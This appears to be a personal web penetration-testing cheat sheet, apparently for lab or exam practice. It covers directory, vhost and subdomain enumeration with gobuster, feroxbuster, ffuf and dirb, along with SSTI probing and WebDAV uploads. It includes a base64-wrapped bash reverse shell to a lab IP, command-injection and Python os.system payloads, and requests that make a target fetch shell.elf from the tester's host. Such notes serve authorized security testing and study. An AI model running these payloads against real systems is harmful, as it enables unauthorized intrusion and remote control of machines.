# Web Ass Tool

## Web Enum
- curl traversal check ``` curl --path-as-is {URL} ```

## Nmap
- Use NSE script
``` http-num  ```

## Use Gobuster 

### Source code
1. ctrl-u to read source code
2. Try finding libraries, engine, plugins, hyperlinks

### Guess what framework / language is using!
- ``` whatweb ```
- Can be identify by error in error page e.g. "Whitelabel Error Page" = Springboot 
- Try "SecList/Discovery/Web-Content/spring-boot.txt"

###  Gobuster fuzzing
1.  ``` gobuster dir -u {ip} -w /usr/share/wordlists/dirb/common.txt -t 42 ```

    ``` -x txt,bak,php,html,js,asp,aspx ```can add filetype here (https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)

    ``` -d ``` discover backup file e.g. .bak

### Gobuster enum API
- Provide pattern in pattern file
    ``` {GOBUSTER}/v1 ```

### Gobuster enun vhost
1. ``` gobuster vhost -u {http://goolugoolu.com} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt  ```

### Enum (RECURSIVELY IF NEEDED!)
    ``` gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern -t 42```

### Try harder !
- Try more seclists
    ```
    /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt
    /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
    ```
- Enum try more file extension!!! (Dont be lazy)
- if website is not case-sentitive can use single case only wordlist

### With proxy simple!
- ``` HTTP_PROXY="http://192.168.153.189:3128/" gobuster dir -u http://192.168.153.189:8080 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 42  ```

## feroxbuster 
- Support recursive and interactive scanning
- ``` feroxbuster -k -u {url} -x {file_type} -o {outputfile} -w {wordlist} ```
### Stop scanning some path within progress
1. Hit 'enter' to start menu
2. ``` c -f {number of branch} ```

## ffuf
### Check subdomain
- ```ffuf -u http://{ip} -H "Host:FUZZ.{hostname}" -w /usr/share/seclists/discovery/dns/subdomains-top1million.txt ```
- ``` -fc 403 ``` filter code = 403
- ``` -fs 1234 ``` filter size = 1234
### Check special character
- ``` using /opt/seclists/fuzzing/special-char.txt ```

## SSTI
- https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti 
- ``` ${{<%[%'"}}%\. ``` Testing these character

### Check which character can be use
1. Try calling the get/post in burp
2. right click the request and "Copy to file"
3. edit the file and add "FUZZ" to the request
4. fuzz ``` fuzz -request search.req -request-proto http -w /usr/share/SecLists/Fuzzing/special-chars.txt ```
5. check which character is vulnerable ( sometimes maybe result size = 0 is )
6. can try code execution e.g. python: maybe code have ```eval()``` and you can ```__import__('os').system(whoami)```

### Java: check link
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

## Base64 encode and decode a one liner
1. ``` echo -n "bash -c 'bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'" | base64 ``` encode
2. ``` echo -n {base64encoded} | base64 -d | bash``` decode and run in victim
   
### Bash command injection
- try url encode also if normal not working
- ```;{sleep 2};```
- ```; sleep 2; ```

## Burp Suite
- You know what to do =]

## Dirb
- check hidden shit
- ``` dirb http://192.168.1.224/ /usr/share/wordlists/dirb/common.txt ```

## Traversal with gobuster if can access machine file system
- e.g. ../../...../Users/Hayer/{Gobuster}.txt .pdf etc...

- curl POST ``` curl -X POST -d "code=2*2" http://192.168.171.117:50000/verify```

- curl POST w/ JSON ``` curl -v -X POST -H "Content-Type: application/json" -d '{"user":"clumsyadmin", "url":"http://192.168.45.197/shell.elf"}' "http://192.168.173.134:13337/update"  ```

- useful file 
1. .htaccess will tell you some hidden allowed key pair header --> add = can access 
   ``` do with burp suite browser
    - proxy -> option -> match and place --> request header & replace: {new header} --> ok
   ```

- Useful url

    ``` sitemap.xml robots.txt ```

- Useful header info

    ``` X-??? ```

- http file to markdown
  ``` curl -s http://192.168.244.140:8000/ | html2markdown ```

## wFuzz
- https://book.hacktricks.xyz/pentesting-web/web-tool-wfuzz 
1. ``` wfuzz -c -z file,/usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -d '{"user":FUZZ,"url":"http://192.168.45.197/shell.elf"}' -H "Content-Type: application/json" -t 20 -v http://192.168.173.134:13337/update ```

# Try Default password !!!

## HTML entity encoder
- https://mothereff.in/html-entities 
- e.g. for java <xml>

# Webdav hacks
- if allow public method POST
## Inject rev shell
1. ``` cadaver http://192.168.219.122 ```
2. input user name
3. input password
4. ``` put sussy.baka ```